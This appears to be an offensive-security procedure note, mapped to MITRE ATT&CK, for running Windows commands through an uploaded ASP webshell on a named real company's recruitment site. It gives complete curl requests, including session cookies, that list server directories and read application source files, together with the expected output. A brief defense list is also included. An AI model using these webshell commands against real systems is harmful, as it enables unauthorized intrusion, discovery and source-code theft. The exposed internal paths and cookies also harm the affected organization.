---
id: proc-004
tags:
  - rce
  - command-injection
  - discovery
  - collection
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
  - '[[Discovery]]'
  - '[[Collection]]'
commands:
  - '[[commands/dir-directory-listing]]'
  - '[[commands/type-source-code-disclosure]]'
  - '[[commands/curl-webshell-dir]]'
  - '[[commands/curl-webshell-type]]'
verified: false
platforms:
  - Web
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Windows Command Shell]]'
updated_at: '2025-12-14T05:32:22.952Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Discovery]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Windows Command Shell]]'
---
# Execute-OS-Commands-via-Webshell-with-Curl

## Summary

This procedure exploits the uploaded ASP webshell to inject and execute Windows OS commands via URL parameters, enabling directory traversal, file reading, and potential data exfiltration.

## Description

The webshell at /recruitjob/tempfiles/temp_uploaded_[GUID].asp processes the ?getsc= parameter unsanitized, spawning cmd.exe processes. Commands like dir and type reveal internal paths (e.g., d:\TrustHX\STBKSERM101\www_app) and source code. Curl sends authenticated GET requests with encoded payloads.

## Requirements

1. Uploaded webshell URL with GUID
2. Session cookies from authentication
3. Curl tool for HTTP requests

## Defense

Defensive measures and detection strategies:

- Input sanitization on all query parameters
- Disable or restrict Process.Start in web applications
- Monitor for anomalous cmd.exe spawns from web processes and unusual HTTP parameters

## Objectives

1. List server directories
2. Disclose sensitive files
3. Demonstrate RCE impact

## Instructions

### Step 1: Execute Directory Listing

**Context**: Use dir command to enumerate file system.

Execute [[commands/curl-webshell-dir]] to send the request:

```bash
curl -i -s -k -X GET -H 'Host: ecjobs.starbucks.com.cn' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: close' -H 'Cookie: _ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' -H 'Upgrade-Insecure-Requests: 1' -b '_ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' 'https://ecjobs.starbucks.com.cn/recruitjob/tempfiles/temp_uploaded_739175df-5949-4bba-9945-1c1720e8e109.asp?getsc=dir%20d:\\TrustHX\\STBKSERM101\\www_app%20%2fd%2fs%2fb'
```

> Output includes HTTP 200 and HTML with <textarea> containing directory listing of paths like bin, common, etc.

### Step 2: Disclose Source Code

**Context**: Use type command to read C# files.

Execute [[commands/curl-webshell-type]]:

```bash
curl -i -s -k -X GET -H 'Host: ecjobs.starbucks.com.cn' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: close' -H 'Cookie: _ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' -H 'Upgrade-Insecure-Requests: 1' -b '_ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' 'https://ecjobs.starbucks.com.cn/recruitjob/tempfiles/temp_uploaded_739175df-5949-4bba-9945-1c1720e8e109.asp?getsc=type%20d:\\TrustHX\\STBKSERM101\\www_app\\concurrent_test\\new_application_concurrent_test__svc.cs'
```

> Output shows source code like using System; class new_application_concurrent_test : IHXPageXmlService { ... } in <textarea>.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution
- [[Discovery]] Discovery
- [[Collection]] Collection

### Techniques

- [[Windows Command Shell]] Windows Command Shell

### Sub-Techniques


## Commands Used

- [[commands/dir-directory-listing]]
- [[commands/type-source-code-disclosure]]
- [[commands/curl-webshell-dir]]
- [[commands/curl-webshell-type]]

## Tools Used

- [[tools/curl]]

## Tags

- [[rce]]
- [[command-injection]]
